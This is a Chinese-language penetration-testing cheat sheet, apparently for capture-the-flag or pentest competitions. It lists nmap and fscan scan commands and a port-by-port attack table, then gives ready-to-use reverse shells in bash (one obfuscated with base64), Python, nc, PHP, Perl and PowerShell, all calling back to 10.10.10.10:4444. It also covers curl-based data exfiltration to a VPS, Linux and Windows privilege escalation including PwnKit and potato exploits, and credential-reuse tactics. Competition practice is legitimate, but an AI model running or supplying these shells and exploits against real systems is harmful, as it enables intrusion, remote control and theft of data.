## 1. 信息收集（进入一个新网段）

```bash
# --- 主机发现（优先用 fscan，快且带指纹）---
fscan -h 192.168.20.0/24 -np
fscan -h 192.168.20.0/24 -np -p 1-65535

# --- nmap（走代理必须 -sT -Pn）---
nmap -sn 192.168.20.0/24                                  # 只探活
nmap -sT -Pn -sV -p 22,80,445,3389,8080 <ip>              # 常规
nmap -sT -Pn -p- --min-rate 1000 <ip>                     # 全端口
nmap -sT -Pn -sC -sV -p- <ip>                             # 带脚本

# --- 不挂代理、纯内网时可以用 SYN 扫描 ---
nmap -sS -Pn -p- --min-rate 2000 <ip>
```

| 端口 | 服务 | 打法方向 |
|---|---|---|
| 21 | FTP | 匿名 / 弱口令 / 被动模式拉文件 |
| 22 | SSH | 弱口令 / 拿到的密钥 |
| 80/8080/8000 | Web | 见第 2 章 |
| 445 | SMB | 永恒之蓝 / PtH / 共享枚举 |
| 1433 | MSSQL | xp_cmdshell |
| 3306 | MySQL | 弱口令 → UDF 提权 |
| 3389 | RDP | 弱口令 / PtH |

| 27017 | MongoDB | 未授权 |
| 88 | Kerberos | 域相关 |

## 3. 反弹 Shell 速查（★ 记不住就翻这里）

```bash
# ===== 监听端（攻击机）=====
nc -lnvp 4444
rlwrap nc -lnvp 4444        # 带上下键

# ===== Bash =====
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
# 过滤了 bash 关键字时：base64 包一层
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE= | base64 -d | bash

# ===== Python3（最稳，真题用过）=====
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

# ===== nc =====
nc -e /bin/bash 10.10.10.10 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f

# ===== PHP =====
php -r '$s=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# ===== Perl =====
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# ===== PowerShell =====
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

**交互式 shell 升级**（拿到裸 shell 后）
```bash

# 然后 Ctrl+Z
stty raw -echo; fg
export TERM=xterm; export SHELL=/bin/bash
```

**无回显怎么办**
```
① 反弹 shell（首选）
② DNS / HTTP 外带：cmd=$(whoami); curl http://<VPS>/$cmd
③ 写到 Web 目录：cmd=whoami > /var/www/html/o.txt
④ 盲注式逐字符（SQL 注入时）
```

## 4. Linux 提权

```bash
# ===== 一键盘点 =====
id; whoami; uname -a; cat /etc/os-release
sudo -l                                       # ★ 权限配置错误最常见
find / -perm -4000 -type f 2>/dev/null        # ★ SUID
getcap -r / 2>/dev/null                       # capabilities
cat /etc/crontab; ls -la /etc/cron*; ls -la /var/spool/cron/crontabs/
ps aux | grep root
netstat -antp
find / -writable -type d 2>/dev/null          # 可写目录
ls -la /home/*/ /root/ 2>/dev/null
cat /etc/passwd
```

**按枚举结果对号入座**

| 发现 | 打法 |
|---|---|
| `sudo -l` 里有能用的命令 | **GTFOBins** 查对应的提权用法 |
| SUID 的 `find` / `cp` / `vim` / `nmap` | GTFOBins |
| SUID 的 `cp` | `cp /flag /tmp/` 直接读（真题用过） |
| 内核版本旧 | `searchsploit "linux kernel $(uname -r)"` |
| **CVE-2021-4034 (PwnKit)** | 用户目录常见 `poc.c` → `gcc poc.c -o poc && ./poc` |
| 可写 cron / systemd 服务 | 改脚本内容等触发 |
| 数据库在本地 | MySQL UDF（见第 8 章） |

```bash
# 内核 exp
uname -r
searchsploit "linux kernel $(uname -r)"
```


**按结果对号入座**

| 发现 | 打法 |
|---|---|
| **SeImpersonatePrivilege** | **土豆系列**：PrintSpoofer / JuicyPotato / GodPotato / SweetPotato |
| 缺某个补丁 | MS16-032、MS15-051 等对应 exp |

## 11. 现场纪律

1. **开局先搭代理**，别先打靶
2. **拿到 shell 先 `ls -la` + 翻 `/home`** —— flag 旁常有 `.hint.txt`（密码模式，要自己爆破）
3. **凭据一定复用** —— 一组密码试遍所有服务和机器
4. **翻容器 / 翻配置** —— 下一跳的凭据常在这
5. **每拿到一台就标记**（Stowaway 用 `addmemo`）
6. **枚举要完整** —— 渗透赛没附件，靠现场信息收集
7. **`getsystem` 超时先 migrate**，别死磕
8. **代理下扫描必须 `-sT -Pn`**（SYN 扫描走不了 socks）
